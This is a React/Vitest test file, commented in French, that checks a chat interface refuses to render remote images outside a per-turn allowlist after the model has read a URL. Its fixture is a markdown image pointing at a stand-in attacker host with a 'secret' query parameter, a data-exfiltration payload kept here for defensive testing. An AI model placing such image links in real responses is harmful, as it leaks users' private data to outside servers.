import { afterEach, describe, expect, it, vi } from 'vitest'
import { act, cleanup, fireEvent, render, screen } from '@testing-library/react'

import Chat from './Component'

/**
 * Images distantes sur un tour qui a lu une URL — câblage du chat.
 *
 * Le backend envoie, AVANT le premier token, la trame `images_autorisees`
 * (l'ensemble de référence des citations du tour : URLs des pages lues, des
 * résultats @web, des sources RAG, du message de l'utilisateur) et la
 * persiste sur la réponse (`images_autorisees`). Ce fichier verrouille que la
 * restriction tient aux TROIS moments où le texte du modèle est rendu :
 * pendant le flux, après `done`, et après rechargement de la conversation.
 *
 * Même patron que `Component.conversation.test.tsx` (double de WebSocket,
 * `fetch` stubé par table d'URL).
 */

const PIEGE = 'https://attaquant.example/x.png?q=secret'
const PAGE = 'https://site.example/article'
const REPONSE = `Résumé de la page [1]. ![](${PIEGE})`

function poserFetch(messagesConv: unknown[]) {
  const table: Record<string, unknown> = {
    '/pair': { token: 'jeton-de-test' },
    '/context': { 'modèle_actif': 'qwen2.5:7b', strict_mode: false, 'instruction_générale': '' },
    '/rag/files': { files: [] },
    '/rag/capabilities': { 'état': 'prêt', disponible: true, message: '', cause: '', 'taille_estimée_mo': 0 },
    '/models': { local: [], local_npu: [], cloud: {}, fournisseurs: {}, recommandations: {} },
    '/voice/capabilities': {
      transcription: { disponible: false, manquants: [], raison: '' },
      'synthèse': { disponible: false, manquants: [], raison: '' },
    },
    '/modules': { modules: [] },
    '/chat/conversations/conv-a': { messages: messagesConv },
    '/chat/conversations': {
      conversations: [{ id: 'conv-a', titre: 'A', date: '', apercu: '', n_messages: 0, 'modifiée': '', n_fichiers: 0 }],
      total: 1,
    },
  }
  vi.stubGlobal('fetch', vi.fn(async (input: RequestInfo | URL) => {
    const url = typeof input === 'string' ? input : String(input)
    const cle = Object.keys(table).find(k => url.includes(k))
    return new Response(JSON.stringify(cle ? table[cle] : { detail: 'Erreur' }), {
      status: cle ? 200 : 500, headers: { 'Content-Type': 'application/json' },
    })
  }))
}

class FakeWebSocket {
  static instances: FakeWebSocket[] = []
  onopen: (() => void) | null = null
  onclose: (() => void) | null = null
  onmessage: ((ev: { data: string }) => void) | null = null
  readonly sent: string[] = []
  readonly url: string
  constructor(url: string) {
    this.url = url
    FakeWebSocket.instances.push(this)
  }
  send(data: string) { this.sent.push(data) }
  close() { /* jamais appelé ici */ }
}

/** Envoie un message comme l'utilisateur (zone de saisie + bouton) : c'est ce
 * qui ouvre un NOUVEAU tour côté client (message utilisateur ajouté). */
async function taper(message: string) {
  const zone = screen.getByPlaceholderText('Écrivez à Épure... (@web pour forcer une recherche)')
  await act(async () => { fireEvent.change(zone, { target: { value: message } }) })
  await act(async () => { fireEvent.click(screen.getByTitle('Envoyer')) })
}

async function attendre() {
  await act(async () => { await new Promise(r => setTimeout(r, 0)) })
}

async function monter(messagesConv: unknown[] = []) {
  localStorage.setItem('epure.chat.conversationId', JSON.stringify('conv-a'))
  poserFetch(messagesConv)
  vi.stubGlobal('WebSocket', FakeWebSocket)
  const rendu = render(<Chat />)
  await act(async () => { await Promise.resolve() })
  const ws = FakeWebSocket.instances[FakeWebSocket.instances.length - 1]
  await act(async () => { ws.onopen?.() })
  await attendre()
  const envoyer = async (data: Record<string, unknown>) => {
    await act(async () => { ws.onmessage?.({ data: JSON.stringify({ conversation_id: 'conv-a', ...data }) }) })
  }
  return { rendu, envoyer }
}

function imagesPiegees(container: HTMLElement) {
  return Array.from(container.querySelectorAll('img')).filter(i => i.getAttribute('src') === PIEGE)
}

HTMLElement.prototype.scrollIntoView = vi.fn()

afterEach(() => {
  cleanup()
  localStorage.clear()
  FakeWebSocket.instances = []
  vi.unstubAllGlobals()
})

describe('Chat — images distantes sur un tour qui a lu une URL', () => {
  it('pendant le flux puis après `done` : l’image hors référence n’est jamais montée', async () => {
    const { rendu, envoyer } = await monter()
    await envoyer({ type: 'images_autorisees', urls: [PAGE] })
    await envoyer({ type: 'token', content: REPONSE })
    expect(imagesPiegees(rendu.container)).toHaveLength(0)
    expect(rendu.container.textContent).toContain(PIEGE)

    await envoyer({ type: 'done', horodatage: '2026-10-18T12:00:00', 'modèle': 'qwen2.5:7b',
                    sources: [], trace_recherche: [], images_autorisees: [PAGE] })
    expect(imagesPiegees(rendu.container)).toHaveLength(0)
  })

  it('la restriction ne déborde pas sur le tour suivant sans lecture d’URL', async () => {
    const { rendu, envoyer } = await monter()
    await taper(`Résume ${PAGE}`)
    await envoyer({ type: 'images_autorisees', urls: [PAGE] })
    await envoyer({ type: 'token', content: 'premier tour' })
    await envoyer({ type: 'done', sources: [], trace_recherche: [], images_autorisees: [PAGE] })
    // Second tour, sans trame `images_autorisees` : comportement inchangé.
    await taper('et une figure ?')
    await envoyer({ type: 'token', content: `![](${PIEGE})` })
    expect(imagesPiegees(rendu.container)).toHaveLength(1)
  })

  it('après rechargement : la restriction persistée s’applique', async () => {
    const { rendu } = await monter([
      { role: 'user', content: `Résume ${PAGE}` },
      { role: 'assistant', content: REPONSE, images_autorisees: [PAGE] },
    ])
    expect(rendu.container.textContent).toContain('Résumé de la page')
    expect(imagesPiegees(rendu.container)).toHaveLength(0)
  })

  it('témoin : sans `images_autorisees`, l’image d’une réponse est rendue (comportement d’avant)', async () => {
    const { rendu } = await monter([
      { role: 'user', content: 'question' },
      { role: 'assistant', content: REPONSE },
    ])
    expect(imagesPiegees(rendu.container)).toHaveLength(1)
  })
})
